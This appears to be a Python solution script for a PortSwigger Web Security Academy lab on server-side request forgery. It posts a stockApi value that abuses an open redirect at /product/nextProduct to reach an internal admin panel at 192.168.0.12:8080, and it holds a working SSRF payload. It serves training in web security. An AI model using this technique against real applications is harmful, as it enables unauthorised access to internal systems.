#!/usr/bin/env python

'''
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

Lab Link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
'''

import requests


lab_id = '0aab00be033440d882804c8c00c5006e' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

# redirect vulnerablity in the nextProduct -> path variable within the stockapi
data = {'stockApi': '/product/nextProduct?path=http://192.168.0.12:8080/admin/'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")
